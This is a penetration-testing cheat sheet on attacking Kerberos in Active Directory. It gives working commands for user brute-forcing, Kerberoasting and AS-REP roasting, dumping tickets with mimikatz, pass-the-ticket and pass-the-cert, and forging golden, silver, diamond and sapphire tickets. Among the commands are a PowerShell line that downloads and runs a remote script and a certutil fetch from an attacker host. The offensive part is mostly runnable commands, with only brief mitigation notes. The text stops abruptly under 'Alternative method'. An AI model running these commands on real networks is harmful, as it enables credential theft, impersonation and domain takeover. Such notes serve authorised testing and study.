# 88 - Kerberos


```url
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

https://youtu.be/_44CHD3Vx-0?si=V98RLUpGApyqQ31z
https://www.youtube.com/watch?v=snGeZlDQL2Q
https://www.youtube.com/watch?v=5N242XcKAsM
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting
https://github.com/dirkjanm/PKINITtools
https://www.onsecurity.io/blog/abusing-kerberos-from-linux/
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist
https://www.tarlogic.com/blog/how-to-attack-kerberos/
```


![](../../assets/image (14).png)

???+ tip
    When dealing with users that have no password, do like
    
    ```
    'dom.com/myuser:' -k
    ```
    
    and then we will have a prompt to input an empty password. DO IT LIKE THIS EVEN THOUGH WE DO NOT HAVE A KERBEROS TICKET. DO NOT USE A TICKET OR .CCACHE TO GET ONE WITH EMPTY PASSWORD, AND DO NOT INCLUDE -no-pass argument, IT WILL FAIL.

## Benefits


```
- Delegated Authentication (enables a service to impersonate its client when connecting to other services)
- Interoperability with other networks following IETF standards
- More efficient authentication to servers (server is not required to go to the DC)
- Mutual Authentication (both client/server or server/server verify their identities)
```


![](../../assets/image (32).png)

![](../../assets/image (137).png)

![](../../assets/image (138).png)

![](../../assets/image (139).png)

## Enumeration


```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" (-Pn) IP
use auxiliary/gather/kerberos_enumusers # MSF
https://github.com/attackdebris/kerberos_enum_userlists

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt
```


### Kerbrute


### Overview
| [https://www.puckiestyle.nl/kerbrute/](https://www.puckiestyle.nl/kerbrute/) |
| ---------------------------------------------------------------------------- |

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - `10.10.120.125  CONTROLLER.local`   &#x20;


### Pre-Authentication
By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)


### Enumerating users
???+ tip
    When I enumerate users, if AS-REP Roasting is possible, kerbrute might  indicate it as well. Otherwise, try **GetNPUsers** after kerbrute.

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

Very basic wordlist [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)


```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt 
# This will brute force user accounts from a domain controller using a supplied wordlist
# IMPORTANT: ADD A FAKE USER TO THE LIST SO WE CHECK THERE ARE NO FALSE POSITIVES
```


Use [https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords.txt)

Having some users, try to build different formats using [https://gist.github.com/superkojiman/11076951#file-namemash-py](https://gist.github.com/superkojiman/11076951#file-namemash-py)

If we know the format (smith, jsmith, john, j.smith, etc.) use the proper file from [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Another resort is to use **cewl** to gather potential user/pass if there is a webserver.



## Kerberos Attacks

[#kerberos](../../post-exploitation/windows/ad/authentication.md#kerberos "mention")

### Kerberoasting


### Exploitation
<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash"><strong>######## HOW TO MAKE IT VULNERABLE
</strong><strong>It has SPN with weak pwd ----> ADD THE DC DOMAIN TO /etc/hosts
</strong># How to set that SPN on the DC
C:\> setspn -a domain.com/$USER.$HOSTNAME  domain.com\$USER

nxc ldap $iP -u USER -p PASS --kerberoast kerberoast.txt

################# IMPACKET (REMOTELY)
GetUserSPNs.py domain.com/SVC_ACCOUNT:StrongPassword22 -dc-ip 10.10.10.1 -request (-output tgs.hash)
# CRACK THE TICKET
./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
# If [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), install below
apt install rdate
rdate -n

############# RUBEUS (ON THE WINDOWS VICTIM MACHINE)
.\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /creduser:s4vicorp.local\mvazquez /credpassword:Password1

############# INVOKE-KERBEROAST
# Extract all accounts in the SPN
setspn -T medin -Q ​ */*
# SPN is the Service Principal Name, and is the mapping between service and account.
# Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
# Lets first get the Powershell Invoke-Kerberoast script.
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
# Now lets load this into memory: 
Invoke-Kerberoast -OutputFormat hashcat |fl
<strong># Crack the hash
</strong><strong>hashcat -m 13100 -​a 0 hash.txt $wordlist --force
</strong>john hashes.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>


### Overview
Kerberoasting allows a user to request a service ticket for any service with a registered Service Principal Name (SPN, the mapping between service and account), and then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like **BloodHound** to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.&#x20;

#### What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the `NTDS.dit`. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.


### Mitigation
* Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
* &#x20;Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.



### AS-REP Roasting


### Exploitation
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># Collect users 
</strong>rpcclient -U 's4vicorp.local\mvazquez%Password1' 10.0.2.15 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users
# HOW TO MAKE IT VULNERABLE -> set preauth for Kerberos
DC > Server Manager > Active Directory Users and Groups > $WHATEVER_USER_WITH_SPN > Account > Do not require Kerberos preauth
GetNPUsers.py -dc-ip 10.0.2.48 s4vicorp.local/ -usersfile users
<strong>
</strong>nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
<strong>
</strong><strong>################### IMPACKET
</strong>A list of usernames (got by Kerbrute previously) is needed
GetNPUsers.py -dc-ip $IP -request $DOMAIN
GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local/

################### RUBEUS
Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.txt
Rubeus.exe asreproast /user:svc_sqlservice /domain:s4vicorp.local /dc:DC-Company
# This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

################### CRACKING HASHES
hashcat -m 18200 hashes.txt rockyou.txt
</code></pre>


### Overview
During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have **pre-authentication disabled**.

Among several tools, **Rubeus** is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.


### Mitigations
* Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
* Don't turn off Kerberos Pre-Authentication unless it's necessary. There's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.



### Timeroasting

[https://github.com/SecuraBV/Timeroast/blob/main/timeroast.ps1](https://github.com/SecuraBV/Timeroast/blob/main/timeroast.ps1)

[https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac)

## Tickets

[#tickets](../../post-exploitation/windows/ad/authentication.md#tickets "mention")

[#tickets](../../post-exploitation/windows/ad/persistence.md#tickets "mention")

> Info/Glossary:

- PAC \(Privileged Authentication Certificate\): a special set of data  contained in the ticket \(TGT or Service Ticket\) that give information  about the requesting user \(username, groups, UserAccountControl, etc\.\)\.
- Long\-term  key: the long\-term key of an account refers to its NT hash \(when the  RC4 etype is not disabled in the domain\) or another Kerberos key \(DES,  AES128, AES256\)\.
Kerberos is an authentication protocol based on tickets\. It basically works like this \(simplified process\):
1\. Client asks the KDC \(Key Distribution Center, usually is a domain controller\) for a TGT \(Ticket Granting Ticket\)\. One of the requesting user's keys is used for pre\-authentication\. The TGT is provided by the Authentication Service \(AS\)\. The client request is called AS\-REQ, the answer is called AS\-REP\.
2\. Client uses the TGT to ask the KDC for a ST \(Service Ticket\)\. That ticket is provided by the Ticket Granting Service \(TGS\)\. The client request is called TGS\-REQ, the answer is called TGS\-REP\.
3\. Client uses the ST \(Service Ticket\) to access a service\. The client request to the service is called AP\-REQ, the service answer is called AP\-REP\.
4\. Both tickets \(TGT and ST\) usually contain an encrypted PAC \(Privilege Authentication Certificate\), a set of information that the target service will read to decide if the authentication user can access the service or not \(user ID, group memberships and so on\)\.
- A Service Ticket \(ST\) allows access to a specific service\.
	- A TGT is encrypted with the krbtgtaccount NT hash\. An attacker knowing the krbtgt's NT hash can forge TGTs impersonating a domain admin\. He can then request STs as a domain admin for any service\. The attacker would have access to everything\. This forged TGT is called a [Golden ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden)\.
	- A ST is encrypted with the service account's NT hash\. An attacker knowing a service account's NT hash can use it to forge a Service ticket and obtain access to that service\. This forged Service ticket is called a [Silver ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver)\.


### Create a ticket

```bash
KRB5CCNAME=user.ccache python3 targetedKerberoast.py ...

# CREATE TICKET (ONLY WORKS W/ PASSWORD AND NOT HASH??)
kinit $USER
Password for user@dom.com: 
klist
...Ticket cache: FILE:/tmp/krb5cc_1000
# Then the authentication
```

### Pass the Ticket

[https://www.thehacker.recipes/ad/movement/kerberos/ptt](https://www.thehacker.recipes/ad/movement/kerberos/ptt)

> Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a **.kirbi** ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using **mimikatz PTT** attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

![](<../../assets/image (130).png>)

```powershell
##### GET A TICKET
# with an NT hash (overpass-the-hash)
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
# with an AES (128 or 256 bits) key (pass-the-key)
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET

# An alternative to requesting the TGT and then passing the ticket is using the -k option in Impacket scripts. Using that option allows for passing either TGTs or STs. Example below with secretsdump.
secretsdump.py -k -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET

############# IMPACKET
getST.py -spn WWW/dc.domain.com -impersonate Administrator domain.com/svc_user -hashes :4efed24079fe2767c67f2b43fd6cb5ac
# If we need to find a SPN, we can use pywerviewer from Linux
pywerview get-netcomputer -u my.user -t 10.10.10.10 --full-data
# We grab the SPN that shows the description msds-allowedtodelegateto, do not confuse it with others
export KRB5CCNAME=Administrator.ccache #export to a env variable 
# Get a shell using PTT
psexec -k -no-pass domain.com/Administrator@dc.domain.com
wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
wmiexec.py dc.domain.com -k -no-pass # include dc.domain.com or any other domain in /etc/hosts (dc.xxx.xxx if it is the domain to target a DC)

############ LOCAL
# Pass the Ticket -> access DC content from a non-DC host/machine on the domain
c:\Windows\Temp\test>hostname
PC-Ramlux
c:\Windows\Temp\test>dir \\DC-Company\c$ # we see we cannot now
b'Access is denied.\r\n'
c:\Windows\Temp\test>certutil -urlcache -split -f http://10.0.2.47:8000/golden.kirbi
# Now pass the TICKET.KIRBI
mimikatz# kerberos::ptt golden.kirbi
mimikatz# exit
klist
c:\Windows\Temp\test>dir \\DC-Company\c$ # now access should be gratned
```

### Dump Tickets
???+ tip
    If you don't have an elevated command prompt (Administrators group), mimikatz will not work properly.


```bash
mimikatz.exe
privilege::debug # Ensure this outputs [output '20' OK]
sekurlsa::tickets /export # this will export all of the .kirbi tickets
```


![](<../../assets/image (56).png>)

When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.

### PassTheCert

> Pass the Certificate (Cert -> NTLM or TGT)

[https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

[https://github.com/AlmondOffSec/PassTheCert/tree/main/Python](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python)


Sometimes, Domain Controllers do not support [PKINIT](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate). This can be because their certificates do not have the `Smart Card Logon` EKU. Most of the time, domain controllers return `KDC_ERR_PADATA_TYPE_NOSUPP` error when the EKU is missing. Fortunately, several protocols — including LDAP — support Schannel, thus authentication through TLS. As the term "schannel authentication" is derived from the [Schannel SSP (Security Service Provider)](https://learn.microsoft.com/en-us/windows-server/security/tls/tls-ssl-schannel-ssp-overview) which is the Microsoft SSL/TLS implementation in Windows, it is important to note that schannel authentication is a SSL/TLS client authentication.

```powershell
# If you use Certipy to retrieve certificates, you can extract key and cert from the pfx by using:
certipy cert -pfx user.pfx -nokey -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key

# elevate a user (it assumes that the domain account for which the certificate was issued, holds privileges to elevate user)
passthecert.py -action modify_user -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1" -target user_sam -elevate

# spawn a LDAP shell
passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1"
certipy auth -pfx -dc-ip "10.0.0.1" -ldap-shell

# If vulnerable template (case ESC1 for example) we can request a certificate
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
# With certipy we can request the ntlm hash of the user and the TGT too
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

```powershell
From UNIX-like systems, Dirk-jan's gettgtpkinit.py from PKINITtools tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms.

# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

Alternatively, Certipy (Python) can be used for the same purpose.

certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'

Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.

certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"

The ticket obtained can then be used to

    authenticate with pass-the-cache
    conduct an UnPAC-the-hash attack. This can be done with getnthash.py from PKINITtools.
    obtain access to the account's SPN with an S4U2Self. This can be done with gets4uticket.py from PKINITtools.

When using Certipy for Pass-the-Certificate, it automatically does UnPAC-the-hash to recover the account's NT hash, in addition to saving the TGT obtained.

Another alternative is with PassTheCert (Python) which can be used to conduct multiple techniques like elevate a user for dcsync.md or change password for a specific user.

# extract key and cert from the pfx
certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"

# elevate a user for DCSYNC with passthecert.py
passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate

You can also use Netexec to perform Pass-the-Certificate authentication:

netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" -u user 
netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user 
netexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u user 
netexec <proto> <ip> --pem-cert "PATH_TO_CRT" --pem-key "PATH_TO_KEY" -u user



From Windows systems, Rubeus (C#) can be used to request a TGT (Ticket Granting Ticket) for the target object from a base64-encoded PFX certificate export (with an optional password).

Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show

PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.

openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"

Certipy uses DER encryption. To generate a PFX for Rubeus, openssl can be used.

openssl rsa -inform DER -in key.key -out key-pem.key
openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM
openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx

To generate a b64 for Rubeus:

$pfx_cert = get-content 'c:\cert.pfx' -Encoding Byte
$base64 = [System.Convert]::ToBase64String($pfx_cert)
$base64

The ticket obtained can then be used to

    authenticate with pass-the-ticket
    conduct an UnPAC-the-hash attack (add the /getcredentials flag to Rubeus's asktgt command)
    obtain access to the account's SPN with an S4U2Self.
```

### Golden Tickets

???+ tip
    In order to craft a golden ticket, testers need to find the `krbtgt`'s RC4 key (i.e. NT hash) or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a [DCSync attack](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync). A Golden Ticket can later be used with Pass-the-ticket to access any resource within the AD domain.

Golden ticket has access to any Kerberos service.


```powershell
# This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
mimikatz# lsadump::lsa /inject /name:krbtgt
mimikatz# kerberos::golden /user:Administrator /domain:dom.com /sid:$DOMAIN_SID /krbtgt:$NTLM_HASH /ticket:golden.kirbi (/id:$GROUP_ID)

# This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

# We could use the ticket to access other machines
misc::cmd
dir \\DESKTOP-1\C$

################ RUBEUS
Rubeus.exe golden /rc4:f9f3d430a22055c9ffd6190032eb82ab /user:Administrator /domain:s4vicorp.local /sid:S-1-5-21-4234973561-2312662453-3533273321 /outfile:rubeus-ticket

There are Impacket scripts for each step of a golden ticket creation : retrieving the krbtgt, retrieving the domain SID, creating the golden ticket.

# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"

On Windows, mimikatz (C) can be used with kerberos::golden for this attack.

# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt

For both mimikatz and Rubeus, the /ptt flag is used to automatically inject the ticket.
```

???+ tip 
	For Golden and Silver tickets, it's important to remember that, by default, ticketer and mimikatz  forge tickets containing PACs that say the user belongs to some  well-known administrators groups (i.e. group ids 513, 512, 520, 518,  519). There are scenarios where these groups are not enough (special  machines where even Domain Admins don't have local admin rights).

In  these situations, testers can specify all the groups ids when creating  the ticket. However, deny ACEs could actually prevent this from working.  Encountering a Deny ACE preventing domain admins to log on could be an  issue when having all groups ids in the ticket, including the domain  admin group id. This solution can also be reall inconvenient in domains  that have lots of groups.
Another solution to this is to look for a specific user with appropriate rights to impersonate and use GoldenCopy  to generate a command that allows to forge a ticket with specific  values corresponding to the target user (sid, group ids, etc.). The  values are gathered from a neo4j database.

### Silver Tickets

These are more discreet and only works for with Pass-the-ticket to **access that specific service**.

```powershell
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver

getST.py        ///    smbclient ... -k
# Transfer ticket.kirbi to the attacking machine and use it to authenticate w/o valid user-pass

# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "USER_TO_IMPERSONATE"
export KRB5CCNAME=XXX.ccache
psexec.py -k -n dom.local/"USER_TO_IMPERSONATE"@DC-Company cmd.exe

The Impacket script ticketer can create silver tickets.

# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey "$AESkey" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"

The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, cifs/target.domain or host/target.domain will allow most remote dumping operations (more info on adsecurity.org).

On Windows, mimikatz can be used to generate a silver ticket with kerberos::golden. Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage.

# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

For both mimikatz and Rubeus, the /ptt flag is used to automatically inject the ticket.
```


???+ tip
    If we face a DC and the service we want to access is internal (port forwarding needed), we need to change /etc/hosts of that domain.com dc.domain.com to point our localhost (where the service is being forwarded to be used).

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

### Diamond ticket  
> Golden and Silver tickets can usually be detected by probes that monitor the service ticket requests \(KRB\_TGS\_REQ\) that have no corresponding TGT requests \(KRB\_AS\_REQ\)\. Those types of tickets also feature forged PACs that sometimes fail at mimicking real ones, thus increasing their detection rates\. Diamond tickets can be a useful alternative in the way they simply request a normal ticket, decrypt the PAC, modify it, recalculate the signatures and encrypt it again\. It requires knowledge of the target service long\-term key \(can be the krbtgtfor a TGT, or a target service for a Service Ticket\)\.

```powershell
From UNIX-like systems, Impacket's ticketer (Python) script can be used for such purposes.

In its actual form (as of September 9th, 2022), the script doesn't modify the PAC in the ticket obtained but instead fully replaces it with a full-forged one. This is not the most stealthy approach as the forged PAC could embed wrong information. Testers are advised to opt for the sapphire ticket approach. On top of that, if there are some structure in the PAC that Impacket can't handle, those structures will be missing in the newly forged PAC.

ticketer.py -request -domain "$DOMAIN" -user "$USER" -password "$PASSWORD" -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'

From Windows systems, Rubeus (C#) can be used for such purposes since https://github.com/GhostPack/Rubeus/pull/136
Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
```

### Convert tickets
> Convert tickets UNIX <-> Windows
Using ticketConverter.py (from the Impacket suite, written in Python).

```powershell
# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
```

### Sapphire ticket  
> Sapphire tickets are similar to Diamond tickets in the way the ticket is not forged, but instead based on a legitimate one obtained after a request\. The difference lays in how the PAC is modified\. The Diamond ticket approach modifies the legitimate PAC to add some privileged groups \(or replace it with a fully\-forged one\)\. In the Sapphire ticket approach, the PAC of another powerful user is obtained through an [S4U2self+u2u](https://www.thehacker.recipes/ad/movement/kerberos/#s4u2self-+-u2u)
trick\. This PAC then replaces the one featured in the legitimate ticket\. The resulting ticket is an assembly of legitimate elements, and follows a standard ticket request, which makes it then most difficult silver/golden ticket variant to detect\.

From UNIX-like systems, Impacket's ticketer (Python) script can be used for such purposes with the -impersonate argument.
The arguments used to customize the PAC will be ignored (-groups, -extra-sid,-duration), the required domain SID (-domain-sid) as well as the username supplied in the positional argument (baduser in this case). All these information will be kept as-is from the PAC obtained beforehand using the "S4U2self + U2U" technique.

```powershell
ticketer.py -request -impersonate 'domainadmin' \
-domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' \
-nthash 'krbtgt NT hash' -aesKey 'krbtgt AES key' \
-user-id '1115' -domain-sid 'S-1-5-21-...' \
'baduser'
```

### KRBTGT&#x20;
In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the **KRBTGT** you give yourself the ability to **create a service ticket for anything** you want. A **TGT** is a **ticket to a service** account issued by the KDC and **can only access that service** the TGT is from like the SQLService ticket.

### Overpass the Hash
> From NTLM hash to Kerberos ticket. Using a an NT hash to obtain Kerberos tickets is called overpass the hash.

```powershell
To convert an NTLM hash to a Kerberos ticket, you can perform an overpass-the-hash attack.

https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
https://www.thehacker.recipes/ad/movement/kerberos/ptk

└─$ impacket-getTGT domain.com/"user" -hashes :7dc430b95e17ed6f817f69366f35be27
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in user.ccache
```


### Convert dumped tickets

```bash
# You could also use the tickets dumped with lsassy using impacket ticketConverter:
ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
```

### Mitigation
Let's talk blue team and how to mitigate these types of attacks.&#x20;

* Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.


## Fix KRB\_AP\_ERR\_SKEW
> Clock skew too great

```bash
# ntpdate will update the time based on an NTP server
systemctl start ntp
sudo ntpdate (-s) $TARGET_IP

# If using Virtualbox, also have to stop the guest utils service or else it changed the time back about 30 seconds after we changed it.
service virtualbox-guest-utils status # maybe this specific service does not exist, status just to check
service vboxadd stop
service vboxadd-service stop
# Remember to restart them if they affect the OS in any way

# Alternative method
